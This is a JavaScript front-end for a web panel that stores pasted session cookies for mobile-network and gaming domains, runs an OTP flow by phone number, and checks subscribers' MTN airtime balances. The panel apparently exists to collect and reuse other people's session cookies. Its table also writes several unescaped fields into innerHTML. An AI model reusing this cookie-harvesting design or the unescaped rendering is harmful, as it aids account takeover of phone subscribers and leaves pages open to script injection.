// Mobile drawer toggle + app actions + OTP & API glue
(function(){
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);

  // Drawer toggle (open/close on every click)
  const tog = $('#mToggle'), drawer = $('#mDrawer');
  if (tog && drawer) {
    tog.addEventListener('click', () => {
      const open = document.body.classList.toggle('nav-open');
      tog.setAttribute('aria-expanded', open ? 'true' : 'false');
      drawer.setAttribute('aria-hidden', open ? 'false' : 'true');
    });
    document.addEventListener('click', (e) => {
      if (!document.body.classList.contains('nav-open')) return;
      if (e.target.closest('#mDrawer') || e.target.closest('#mToggle')) return;
      document.body.classList.remove('nav-open');
      tog.setAttribute('aria-expanded', 'false');
      drawer.setAttribute('aria-hidden', 'true');
    });
  }

  // Helpers
  async function postJSON(url, data){
    const res = await fetch(url, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      credentials:'same-origin',
      body: JSON.stringify(data||{})
    });
    return res.json();
  }
  function last9(phone){
    const d = (phone||'').replace(/\D+/g,'');
    return d.slice(-9);
  }

  // Load cookies list
  async function loadCookies(){
    const r = await postJSON('api.php', {action:'list'});
    const body = $('#cookiesBody');
    const count = $('#countNote');
    if (!body) return;
    body.innerHTML = '';
    let items = (r && r.items) || [];
    if (count) count.textContent = `Total: ${items.length}`;
    if (!items.length){
      body.innerHTML = '<tr><td colspan="7" class="muted">No cookies stored yet.</td></tr>';
      return;
    }
    for (const row of items){
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${(row.name||'').replace(/</g,'&lt;')}</td>
        <td>${(row.phone||'')}</td>
        <td><span class="tag">${row.network||''}</span></td>
        <td><span class="tag">${row.domain||''}</span></td>
        <td>${(row.label||'')}</td>
        <td>${row.balance ? '<span class="tag ok">R'+row.balance+'</span>' : '<span class="tag">N/A</span>'}</td>
        <td>
          <button class="btn btn-balance" data-id="${row.id||''}" data-domain="${row.domain||''}" data-phone="${row.phone||''}">Check Balance</button>
          <button class="btn btn-remove" data-id="${row.id||''}">Remove</button>
        </td>`;
      body.appendChild(tr);
    }
  }

  // Manual add
  const addBtn = $('#btnAdd');
  if (addBtn){
    addBtn.addEventListener('click', async () => {
      const network = $('#netSelect').value || '';
      const domain  = $('#domSelect').value || '';
      const label   = $('#label').value || '';
      const cookie  = $('#cookieStr').value || '';
      const msg = $('#addMsg');
      if (!network || !domain || !cookie){ msg && (msg.textContent='Please fill network, domain and cookie.'); return; }
      const r = await postJSON('api.php', {action:'add_paste', network, domain, label, cookie});
      if (r.error){ msg && (msg.textContent=r.message||'Error'); msg && msg.classList.add('err'); return; }
      msg && (msg.textContent=r.message||'Saved'); msg && msg.classList.remove('err');
      loadCookies();
    });
  }

  // OTP flow to otp.php
  window.sendOTPClick = async function(){
    const provider = ($('#provider')||{}).value || '';
    const msisdn = ($('#msisdn')||{}).value || '';
    const msg = $('#otpMsg');
    if (!provider){ msg && (msg.textContent='Choose provider'); return false; }
    if (!msisdn){ msg && (msg.textContent='Enter MSISDN'); return false; }
    try{
      msg && (msg.textContent='Sending OTP…');
      const r = await postJSON('otp.php', { action:'send', provider, phone: msisdn });
      if (r.error){ msg && (msg.textContent=r.message||'Error'); return false; }
      $('#otpRow').style.display = '';
      msg && (msg.textContent = r.message || 'OTP sent');
      window.__parsed = r.parsed || '';
    }catch(e){ msg && (msg.textContent='Network error'); }
    return false;
  };
  document.addEventListener('click', async (e) => {
    const v = e.target.closest && e.target.closest('#verifyBtn');
    if (!v) return;
    const provider = ($('#provider')||{}).value || '';
    const msg = $('#otpMsg');
    const otp = ($('#otpCode')||{}).value || '';
    try{
      msg && (msg.textContent='Verifying…');
      const r = await postJSON('otp.php', { action:'verify', provider, parsed: (window.__parsed||''), otp });
      if (r.error){ msg && (msg.textContent=r.message||'Invalid OTP'); return; }
      msg && (msg.textContent = r.message || 'Saved');
      loadCookies();
      setTimeout(()=>{ location.hash='#stores'; }, 500);
    }catch(e){ msg && (msg.textContent='Network error'); }
  });

  // Remove + Balance actions
  document.addEventListener('click', async (e) => {
    const rm = e.target.closest && e.target.closest('.btn-remove');
    if (rm){
      const id = rm.dataset.id||'';
      await postJSON('api.php', {action:'remove', id});
      loadCookies();
      return;
    }
    const bal = e.target.closest && e.target.closest('.btn-balance');
    if (bal){
      const domain = bal.dataset.domain||'';
      const digits = last9(bal.dataset.phone||'');
      const id = bal.dataset.id||'';
      if (domain==='gameplay.mzansigames.club'){
        alert('Vodacom balance not wired yet');
        return;
      }
      const r = await postJSON('api.php', {action:'balance_mtn', msisdn9: digits, domain, id});
      if (r.error){ alert(r.message||'Balance error'); return; }
      // Update cell
      const td = bal.closest('tr').children[5];
      td.innerHTML = r.balance ? ('<span class="tag ok">R'+r.balance+'</span>') : '<span class="tag">N/A</span>';
    }
  });

  // First load
  loadCookies();
})();
